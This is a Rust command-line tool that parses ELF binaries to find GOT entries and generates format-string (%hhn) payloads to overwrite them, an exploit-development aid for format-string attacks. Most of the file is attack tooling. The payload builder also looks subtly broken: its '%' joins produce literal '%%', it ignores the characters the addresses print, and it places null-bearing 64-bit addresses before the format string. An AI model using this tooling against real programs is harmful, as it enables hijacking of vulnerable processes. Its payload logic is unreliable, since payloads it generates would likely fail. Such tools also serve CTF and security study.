//! got - GOT覆写计算器 (格式串攻击辅助)
//! 纯 Rust 解析 ELF, 不再依赖 readelf/nm/objdump

use clap::Parser;
use common::{exit, finish, parse_hex, Mode, Out};
use goblin::elf::header::{EM_386, EM_AARCH64, EM_ARM, EM_X86_64};
use goblin::elf::program_header::{PF_X, PT_LOAD};
use goblin::elf::reloc::{
    R_386_GLOB_DAT, R_386_JMP_SLOT, R_AARCH64_GLOB_DAT, R_AARCH64_JUMP_SLOT, R_ARM_GLOB_DAT,
    R_ARM_JUMP_SLOT, R_X86_64_GLOB_DAT, R_X86_64_JUMP_SLOT,
};
use goblin::elf::{Elf, Sym};
use serde::Serialize;
use std::io::Write;
use std::path::PathBuf;
use std::process::ExitCode;

#[derive(Parser, Debug)]
#[command(
    name = "got",
    version,
    about = "GOT覆写计算器 - 格式串攻击辅助",
    long_about = "pwn-got: GOT覆写计算器 - 格式串攻击辅助\n用法:\n    pwn-got <binary> <function>             # 查GOT地址\n    pwn-got <binary> <func> --write <addr>  # 计算格式串写入payload\n    pwn-got <binary> <func> --libc <libc.so> # 用libc自动算目标值\n    pwn-got --fmt <got_addr> <target_val>   # 纯计算格式串payload",
    after_help = "退出码: 0=成功 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    /// 目标 ELF 文件 (--fmt 模式下为 GOT 地址)
    #[arg(value_name = "BINARY")]
    binary: Option<String>,

    /// 函数名 (--fmt 模式下为目标值)
    #[arg(value_name = "FUNCTION")]
    function: Option<String>,

    /// 纯计算模式: got --fmt <got_addr_hex> <target_val_hex>
    #[arg(long)]
    fmt: bool,

    /// 计算格式串写入payload的目标地址(hex)
    #[arg(long, value_name = "ADDR")]
    write: Option<String>,

    /// libc 文件, 自动计算函数偏移
    #[arg(long, value_name = "LIBC")]
    libc: Option<String>,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize)]
struct FmtReport {
    got: u64,
    target: u64,
    payload_len: usize,
    payload_hex: String,
    format_string: String,
}

#[derive(Serialize, Clone)]
struct LibcInfo {
    path: String,
    offset: Option<u64>,
}

#[derive(Serialize)]
struct QueryReport {
    file: String,
    function: String,
    got: u64,
    current: u64,
    status: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    libc: Option<LibcInfo>,
    #[serde(skip_serializing_if = "Option::is_none")]
    target: Option<u64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    payload_len: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    payload_hex: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    format_string: Option<String>,
}

fn to_hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

fn write_payload(data: &[u8]) {
    let stdout = std::io::stdout();
    let mut h = stdout.lock();
    let _ = h.write_all(data);
    let _ = h.flush();
}

fn make_fmt_write_byte(got_addr: u64, value: u64, start_idx: usize) -> (Vec<u8>, String) {
    let mut addrs: Vec<u8> = Vec::new();
    let mut fmt_parts: Vec<String> = Vec::new();
    let mut prev: u64 = 0;

    for i in 0..8u32 {
        let byte_val = (value >> (i * 8)) & 0xFF;
        if byte_val == 0 && i > 0 {
            continue;
        }
        addrs.extend_from_slice(&(got_addr + i as u64).to_le_bytes());
        let diff = byte_val.wrapping_sub(prev) % 256;
        let idx = start_idx + fmt_parts.len();
        if diff > 0 {
            fmt_parts.push(format!("%{diff}c%{idx}$hhn"));
        } else {
            fmt_parts.push(format!("%{idx}$hhn"));
        }
        prev = byte_val;
    }

    let fmt = fmt_parts.join("%");
    let mut payload = addrs;
    payload.extend_from_slice(fmt.as_bytes());
    (payload, fmt)
}

fn clean_name(name: &str) -> &str {
    name.split('@').next().unwrap_or(name)
}

fn is_got_reloc(machine: u16, r_type: u32) -> bool {
    match machine {
        EM_X86_64 => r_type == R_X86_64_GLOB_DAT || r_type == R_X86_64_JUMP_SLOT,
        EM_386 => r_type == R_386_GLOB_DAT || r_type == R_386_JMP_SLOT,
        EM_AARCH64 => r_type == R_AARCH64_GLOB_DAT || r_type == R_AARCH64_JUMP_SLOT,
        EM_ARM => r_type == R_ARM_GLOB_DAT || r_type == R_ARM_JUMP_SLOT,
        _ => true,
    }
}

fn find_got(elf: &Elf, func: &str) -> Option<u64> {
    let mut fallback = None;
    for section in [&elf.pltrelocs, &elf.dynrelas, &elf.dynrels] {
        for reloc in section.iter() {
            let Some(sym) = elf.dynsyms.get(reloc.r_sym) else {
                continue;
            };
            let Some(name) = elf.dynstrtab.get_at(sym.st_name) else {
                continue;
            };
            if clean_name(name) != func {
                continue;
            }
            if is_got_reloc(elf.header.e_machine, reloc.r_type) {
                return Some(reloc.r_offset);
            }
            if fallback.is_none() {
                fallback = Some(reloc.r_offset);
            }
        }
    }
    fallback
}

fn find_dynsym(elf: &Elf, func: &str) -> Option<Sym> {
    let mut fallback = None;
    for sym in elf.dynsyms.iter() {
        let Some(name) = elf.dynstrtab.get_at(sym.st_name) else {
            continue;
        };
        if clean_name(name) != func {
            continue;
        }
        if sym.st_shndx != 0 {
            return Some(sym);
        }
        fallback = Some(sym);
    }
    fallback
}

fn vaddr_to_offset(elf: &Elf, vaddr: u64) -> Option<usize> {
    for ph in &elf.program_headers {
        if ph.p_type != PT_LOAD {
            continue;
        }
        if vaddr >= ph.p_vaddr && vaddr < ph.p_vaddr + ph.p_filesz {
            return Some((ph.p_offset + (vaddr - ph.p_vaddr)) as usize);
        }
    }
    None
}

fn read_got_value(data: &[u8], elf: &Elf, got_addr: u64) -> u64 {
    let size = if elf.is_64 { 8 } else { 4 };
    let Some(off) = vaddr_to_offset(elf, got_addr) else {
        return 0;
    };
    if off + size > data.len() {
        return 0;
    }
    let mut buf = [0u8; 8];
    buf[..size].copy_from_slice(&data[off..off + size]);
    u64::from_le_bytes(buf)
}

fn points_into_exec(elf: &Elf, addr: u64) -> bool {
    elf.program_headers.iter().any(|ph| {
        ph.p_type == PT_LOAD
            && ph.p_flags & PF_X != 0
            && addr >= ph.p_vaddr
            && addr < ph.p_vaddr + ph.p_memsz
    })
}

fn load_libc_offset(path: &str, func: &str) -> Result<Option<u64>, String> {
    let data = std::fs::read(path).map_err(|e| format!("cannot read {path}: {e}"))?;
    let elf = Elf::parse(&data).map_err(|e| format!("not an ELF file ({path}): {e}"))?;
    Ok(find_dynsym(&elf, func)
        .filter(|s| s.st_shndx != 0)
        .map(|s| s.st_value))
}

fn run_fmt_mode(args: &Args, out: &Out) -> ExitCode {
    let (Some(got_s), Some(target_s)) = (&args.binary, &args.function) else {
        out.error("Usage: got --fmt <got_addr_hex> <target_val_hex>");
        return finish(exit::USAGE);
    };
    let got = match parse_hex(got_s) {
        Ok(v) => v,
        Err(e) => {
            out.error(&e);
            return finish(exit::USAGE);
        }
    };
    let target = match parse_hex(target_s) {
        Ok(v) => v,
        Err(e) => {
            out.error(&e);
            return finish(exit::USAGE);
        }
    };

    let (payload, fmt) = make_fmt_write_byte(got, target, 6);
    let report = FmtReport {
        got,
        target,
        payload_len: payload.len(),
        payload_hex: to_hex(&payload),
        format_string: fmt.clone(),
    };

    out.emit(
        || {
            println!("[*] GOT:  0x{got:x}");
            println!("[*] Target: 0x{target:x}");
            println!("[*] Payload ({} bytes):", payload.len());
            write_payload(&payload);
            println!();
            println!("[*] Format string: {fmt}");
        },
        &report,
    );

    finish(exit::OK)
}

fn run_query(binary: &str, func: &str, args: &Args, out: &Out) -> ExitCode {
    let path = PathBuf::from(binary);
    if !path.is_file() {
        out.error(&format!("File not found: {binary}"));
        return finish(exit::ERROR);
    }
    let data = match std::fs::read(&path) {
        Ok(d) => d,
        Err(e) => {
            out.error(&format!("cannot read {binary}: {e}"));
            return finish(exit::ERROR);
        }
    };
    let elf = match Elf::parse(&data) {
        Ok(e) => e,
        Err(e) => {
            out.error(&format!("not an ELF file: {e}"));
            return finish(exit::ERROR);
        }
    };

    let got_addr = match find_got(&elf, func) {
        Some(a) => a,
        None => {
            out.error(&format!("GOT entry not found for: {func}"));
            return finish(exit::NO_RESULT);
        }
    };
    let current = read_got_value(&data, &elf, got_addr);
    let sym_val = find_dynsym(&elf, func).map(|s| s.st_value).unwrap_or(0);
    let status = if current == 0 {
        "unbound"
    } else if (sym_val != 0 && current == sym_val) || points_into_exec(&elf, current) {
        "lazy"
    } else {
        "resolved"
    };

    let libc_info = match &args.libc {
        Some(libc_path) => match load_libc_offset(libc_path, func) {
            Ok(off) => Some(LibcInfo {
                path: libc_path.clone(),
                offset: off,
            }),
            Err(e) => {
                out.error(&e);
                return finish(exit::ERROR);
            }
        },
        None => None,
    };

    let write_info = match &args.write {
        Some(s) => match parse_hex(s) {
            Ok(target) => {
                let (payload, fmt) = make_fmt_write_byte(got_addr, target, 6);
                Some((target, payload, fmt))
            }
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        },
        None => None,
    };

    let report = QueryReport {
        file: binary.to_string(),
        function: func.to_string(),
        got: got_addr,
        current,
        status: status.to_string(),
        libc: libc_info.clone(),
        target: write_info.as_ref().map(|(t, _, _)| *t),
        payload_len: write_info.as_ref().map(|(_, p, _)| p.len()),
        payload_hex: write_info.as_ref().map(|(_, p, _)| to_hex(p)),
        format_string: write_info.as_ref().map(|(_, _, f)| f.clone()),
    };

    out.emit(
        || {
            println!("[*] Function: {func}");
            println!("[*] GOT:      0x{got_addr:x}");
            println!("[*] Current:  0x{current:x}");
            if let Some(info) = &libc_info {
                match info.offset {
                    Some(off) => {
                        println!("[*] Libc {func}: 0x{off:x}");
                        println!(
                            "[*] Hint: if libc loaded at 0x1234000, {func} = 0x{:x}",
                            0x1234000u64 + off
                        );
                    }
                    None => eprintln!("[-] libc 中未找到符号: {func} ({})", info.path),
                }
            }
            if let Some((target, payload, _)) = &write_info {
                println!("[*] Target value: 0x{target:x}");
                println!("[*] Payload ({} bytes):", payload.len());
                write_payload(payload);
                println!();
            }
            match status {
                "lazy" => {
                    println!("[!] GOT未绑定(Lazy Binding), 值=PLT stub");
                    println!("    触发一次 {func}() 后再用 --write");
                }
                "resolved" => println!("[*] 已解析到: 0x{current:x}"),
                _ => {}
            }
        },
        &report,
    );

    finish(exit::OK)
}

fn main() -> ExitCode {
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    if args.fmt {
        return run_fmt_mode(&args, &out);
    }
    match (&args.binary, &args.function) {
        (Some(binary), Some(func)) => run_query(binary, func, &args, &out),
        _ => {
            out.error("Usage: got <binary> <function> | got --fmt <got_addr_hex> <target_val_hex>");
            finish(exit::USAGE)
        }
    }
}
